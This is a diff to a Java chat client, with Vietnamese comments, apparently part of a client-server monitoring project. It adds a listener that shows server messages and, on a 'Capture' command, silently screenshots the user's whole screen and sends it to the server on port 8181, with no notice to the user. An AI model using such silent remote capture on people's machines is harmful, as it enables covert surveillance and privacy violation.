@@ -80,9 +80,48 @@ public class ClientApp extends JFrame {
          Thread processInfoThread = new Thread(new ProcessInfoSender());
          processInfoThread.start();
 
+         // Thread lắng nghe tin nhắn và lệnh từ server
+         Thread listenThread = new Thread(() -> {
+             try {
+                 String line;
+                 while ((line = in.readLine()) != null) {
+                     if (line.startsWith("MSG:")) {
+                         String msg = line.substring(4);
+                         chatTextArea.append("Tin nhắn từ server: " + msg + "\n");
+                     } else if (line.equals("Capture")) {
+                         captureScreenAndSend(serverIp);
+                     }
+                     // Có thể xử lý thêm các lệnh khác ở đây nếu muốn
+                 }
+             } catch (IOException e) {
+                 chatTextArea.append("Mất kết nối tới server.\n");
+             }
+         });
+         listenThread.start();
+
      } catch (IOException e) {
          chatTextArea.append("Connection to the server failed.\n");
          e.printStackTrace();
+     }
+ }
+
+ // Hàm chụp màn hình và gửi về server qua port 8181
+ private void captureScreenAndSend(String serverIp) {
+     try {
+         java.awt.image.BufferedImage screenImage = new java.awt.Robot().createScreenCapture(
+                 new java.awt.Rectangle(java.awt.Toolkit.getDefaultToolkit().getScreenSize()));
+         java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+         javax.imageio.ImageIO.write(screenImage, "png", baos);
+         byte[] imageData = baos.toByteArray();
+
+         try (java.net.Socket imageSocket = new java.net.Socket(serverIp, 8181)) {
+             java.io.DataOutputStream dos = new java.io.DataOutputStream(imageSocket.getOutputStream());
+             dos.writeInt(imageData.length);
+             dos.write(imageData);
+             dos.flush();
+         }
+     } catch (Exception e) {
+         chatTextArea.append("Lỗi gửi ảnh chụp màn hình!\n");
      }
  }
  
